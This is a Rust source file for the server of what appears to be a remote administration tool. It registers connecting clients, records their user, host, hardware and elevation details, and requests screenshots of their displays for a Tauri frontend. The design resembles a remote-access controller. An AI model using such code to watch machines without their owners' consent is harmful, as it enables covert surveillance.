use std::collections::HashMap;
use tokio::sync::mpsc::{Receiver, Sender};
use std::net::SocketAddr;

use std::sync::{ Arc, Mutex };
use tauri::{ AppHandle, Manager };

use common::async_impl::packets::ClientInfo;

use rand::rngs::OsRng;
use rand::Rng;
use rsa::{pkcs8::ToPublicKey, PaddingScheme, RsaPrivateKey, RsaPublicKey};
use base64::{engine::general_purpose, Engine as _};

use common::async_impl::packets::*;

use anyhow::{Context, Result};

use crate::commands::*;

use common::{ENC_TOK_LEN, RSA_BITS};


pub struct ServerWrapper {
    receiver: Receiver<ServerCommand>,
    txs: HashMap<std::net::SocketAddr, Sender<ClientCommand>>,
    connected_users: HashMap<std::net::SocketAddr, ClientInfo>,
    priv_key: RsaPrivateKey,
    pub_key: RsaPublicKey,
    tauri_handle: Option<Arc<Mutex<AppHandle>>>,
}

impl ServerWrapper {
    pub async fn spawn(receiver: Receiver<ServerCommand>) -> Result<()> {
        let txs: HashMap<std::net::SocketAddr, Sender<ClientCommand>> = HashMap::new();
        let connected_users: HashMap<std::net::SocketAddr, ClientInfo> = HashMap::new();
        let mut rng = OsRng;
        let priv_key =
            RsaPrivateKey::new(&mut rng, RSA_BITS).with_context(|| "Failed to generate a key.")?;
        let pub_key = RsaPublicKey::from(&priv_key);

        let s = Self {
            receiver,
            txs,
            connected_users,
            priv_key,
            pub_key,
            tauri_handle: None,
        };

        s.channel_loop().await;

        Ok(())
    }
    
    async fn emit_client_connected(&self, client_info: &ClientInfo) {
        if let Some(handle) = &self.tauri_handle {
            let _ = handle
                .lock()
                .unwrap()
                .emit_all("client_connected", client_info.username.clone())
                .unwrap_or_else(|e| println!("Failed to emit client_connected event: {}", e));
        } else {
            println!("Cannot send client_connected event: Tauri handle not set");
        }
    }
    
    async fn emit_client_disconnected(&self, addr: &SocketAddr) {
        println!("Emitting client_disconnected event for {}", addr);
        
        let username = if let Some(client_info) = self.connected_users.get(addr) {
            println!("Found client info for {}: username={}", addr, client_info.username);
            client_info.username.clone()
        } else {
            println!("No client info found for {}, using IP as username", addr);
            addr.to_string() // Fallback to IP if client info not found
        };
        
        if let Some(handle) = &self.tauri_handle {
            println!("Emitting client_disconnected event with username: {}", username);
            match handle.lock().unwrap().emit_all("client_disconnected", username.clone()) {
                Ok(_) => println!("Successfully emitted client_disconnected event for {}", username),
                Err(e) => println!("Failed to emit client_disconnected event: {}", e),
            }
        } else {
            println!("Cannot send client_disconnected event: Tauri handle not set");
        }
    }
    
    async fn test_event_emission(&self, message: &str) {
        println!("Testing event emission with message: {}", message);
        if let Some(handle) = &self.tauri_handle {
            match handle.lock().unwrap().emit_all("client_test_event", message) {
                Ok(_) => println!("Successfully emitted test event: {}", message),
                Err(e) => println!("Failed to emit test event: {}", e),
            }
        } else {
            println!("Cannot send test event: Tauri handle not set");
        }
    }

    async fn channel_loop(mut self) {
        loop {
            use crate::commands::ServerCommand::*;

            let p = match self.receiver.recv().await {
                Some(p) => p,
                None => break,
            };

            match p {
                EncryptionRequest(tx, otx) => {
                    let mut token = [0u8; ENC_TOK_LEN];
                    OsRng.fill(&mut token);
                    tx.send(ClientCommand::Write(
                        ClientboundPacket::EncryptionResponse(
                            self.pub_key.to_public_key_der().unwrap().as_ref().to_vec(),
                            token.to_vec(),
                        ),
                    ))
                    .await
                    .unwrap();
                    otx.send(token.to_vec()).unwrap();
                }
                EncryptionConfirm(tx, otx, enc_s, enc_t, exp_t) => {
                    let t = {
                        let padding = PaddingScheme::new_pkcs1v15_encrypt();
                        self.priv_key
                            .decrypt(padding, &enc_t)
                            .expect("Failed to decrypt.")
                    };
                    if t != exp_t {
                        eprintln!("Encryption handshake failed!");
                        tx.send(ClientCommand::Close).await.ok();
                        otx.send(Err(())).unwrap();
                    } else {
                        let s = {
                            let padding = PaddingScheme::new_pkcs1v15_encrypt();
                            self.priv_key
                                .decrypt(padding, &enc_s)
                                .expect("Failed to decrypt.")
                        };
                        otx.send(Ok(s.clone())).unwrap();
                        tx.send(ClientCommand::SetSecret(Some(s.clone())))
                            .await
                            .unwrap();
                        tx.send(ClientCommand::Write(ClientboundPacket::EncryptionAck))
                            .await
                            .unwrap();

                        // After successful encryption, request client info
                        tx.send(ClientCommand::Write(ClientboundPacket::InitClient))
                            .await
                            .unwrap();
                    }
                }
                RegisterClient(tx, addr, client_info) => {
                    println!("Registering client: {} from {}", client_info.hostname, addr);
                    // Store the client's connection sender
                    self.txs.insert(addr, tx);
                    // Store the client info
                    self.connected_users.insert(addr, client_info.clone());
                    
                    println!("New client registered: {:?}", client_info);
                    
                    self.emit_client_connected(&client_info).await;
                    
                    // Test event emission to verify Tauri events
                    self.test_event_emission("New client registered test event").await;
                }
                ScreenshotData(addr, screenshot_data) => {
                    println!("Received screenshot from {}, size: {} bytes", addr, screenshot_data.len());
                    
                    // Convert screenshot data to base64 for sending to frontend
                    let base64_img = general_purpose::STANDARD.encode(&screenshot_data);
                    
                    // Send to Tauri frontend if handle exists
                    if let Some(handle) = &self.tauri_handle {
                        println!("Sending screenshot to frontend");
                        if let Err(e) = handle.lock().unwrap().emit_all("client_screenshot", base64_img) {
                            println!("Error sending screenshot to frontend: {}", e);
                        } else {
                            println!("Screenshot sent to frontend successfully");
                        }
                    } else {
                        println!("Cannot send screenshot to frontend: Tauri handle not set");
                    }
                    
                    if let Some(client_info) = self.connected_users.get(&addr) {
                        println!("Screenshot from client: {}", client_info.hostname);
                    }
                }
                TakeScreenshot(addr, display) => {
                    println!("Taking screenshot from client at {}, display {}", addr, display);
                    if let Some(tx) = self.txs.get(&addr) {
                        tx.send(ClientCommand::Write(ClientboundPacket::ScreenshotDisplay(display)))
                            .await
                            .unwrap_or_else(|e| println!("Failed to send screenshot request: {}", e));
                    } else {
                        println!("Client at {} not found", addr);
                    }
                }
                GetClients(resp) => {
                    // Convert our internal client representation to FrontClient
                    let mut clients = Vec::new();
                    
                    for (addr, client_info) in self.connected_users.iter() {
                        clients.push(crate::handlers::FrontClient {
                            addr: addr.clone(),
                            username: client_info.username.clone(),
                            hostname: client_info.hostname.clone(),
                            os: client_info.os.clone(),
                            ram: client_info.ram.clone(),
                            cpu: client_info.cpu.clone(),
                            gpus: client_info.gpus.clone(),
                            storage: client_info.storage.clone(),
                            displays: client_info.displays,
                            ip: addr.to_string(),
                            disconnected: !self.txs.contains_key(addr),
                            is_elevated: client_info.is_elevated,
                        });
                    }
                    
                    resp.send(clients).ok();
                }
                GetClient(addr, resp) => {
                    if let Some(client_info) = self.connected_users.get(&addr) {
                        let front_client = crate::handlers::FrontClient {
                            addr: addr.clone(),
                            username: client_info.username.clone(),
                            hostname: client_info.hostname.clone(),
                            os: client_info.os.clone(),
                            ram: client_info.ram.clone(),
                            cpu: client_info.cpu.clone(),
                            gpus: client_info.gpus.clone(),
                            storage: client_info.storage.clone(),
                            displays: client_info.displays,
                            ip: addr.to_string(),
                            disconnected: !self.txs.contains_key(&addr),
                            is_elevated: client_info.is_elevated,
                        };
                        
                        resp.send(Some(front_client)).ok();
                    } else {
                        resp.send(None).ok();
                    }
                }
                SetTauriHandle(handle) => {
                    println!("Setting Tauri AppHandle");
                    self.tauri_handle = Some(Arc::new(Mutex::new(handle)));
                }
                ClientDisconnected(addr) => {
                    println!("Client disconnected: {}", addr);
                    
                    self.txs.remove(&addr);
                    
                    let client_info = self.connected_users.remove(&addr);
                    
                    if let Some(client_info) = client_info.clone() {
                        let username = client_info.username.clone();                        
                        if let Some(handle) = &self.tauri_handle {
                            match handle.lock().unwrap().emit_all("client_disconnected", username.clone()) {
                                Ok(_) => println!("Successfully emitted client_disconnected event for {}", username),
                                Err(e) => println!("Failed to emit client_disconnected event: {}", e),
                            }
                        } else {
                            println!("Cannot send client_disconnected event: Tauri handle not set");
                        }
                    } else {
                        println!("No client info found for {}", addr);
                        self.emit_client_disconnected(&addr).await;
                    }
                },
            }
        }
    }
}